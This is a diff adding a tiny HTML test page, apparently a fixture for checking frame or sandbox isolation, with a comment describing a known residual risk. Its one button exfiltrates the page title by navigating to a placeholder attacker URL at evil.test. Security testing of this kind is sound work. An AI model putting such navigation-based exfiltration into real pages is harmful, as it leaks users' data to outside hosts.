@@ -1,0 +1,8 @@
+<!doctype html>
+<html>
+<head><meta charset="utf-8"><title>secret-title</title></head>
+<body>
+<!-- The documented residual risk: a page may navigate its own frame anywhere. -->
+<button onclick="location.href = 'http://evil.test/exfil?d=' + encodeURIComponent(document.title)">Navigate away</button>
+</body>
+</html>
